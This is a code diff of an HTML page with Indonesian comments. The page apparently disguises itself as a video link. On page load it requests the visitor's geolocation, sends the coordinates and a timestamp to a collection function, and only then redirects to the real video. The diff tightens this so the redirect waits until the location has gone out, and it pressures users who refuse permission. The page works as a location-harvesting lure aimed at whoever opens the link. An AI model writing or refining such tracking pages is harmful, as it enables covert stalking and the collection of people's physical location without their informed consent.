@@ -22,6 +22,16 @@
             waktu: new Date().toISOString()
           }
         })
+      }).then(() => {
+        // Redirect ke video setelah lokasi dikirim
+        if (redirectTo) {
+          window.location.href = decodeURIComponent(redirectTo);
+        } else {
+          document.body.innerHTML = "Video tidak ditemukan.";
+        }
+      }).catch((err) => {
+        alert("Gagal mengirim lokasi.");
+        console.error(err);
       });
     }
 
@@ -30,24 +40,16 @@
         navigator.geolocation.getCurrentPosition(function(pos) {
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
-
           kirimLokasi(lat, lon);
-
-          // Redirect ke video asli setelah lokasi dikirim
-          if (redirectTo) {
-            window.location.href = decodeURIComponent(redirectTo);
-          } else {
-            document.body.innerHTML = "Gagal memuat video.";
-          }
         }, function(error) {
-          alert("Izin lokasi dibutuhkan untuk melanjutkan.");
+          alert("Izin lokasi dibutuhkan agar bisa lanjut.");
         });
       } else {
-        alert("Browser tidak mendukung geolokasi.");
+        alert("Browser kamu tidak mendukung pelacakan lokasi.");
       }
     }
 
-    // Mulai proses
+    // Jalankan saat halaman dibuka
     mulaiLacak();
   </script>
 </body>
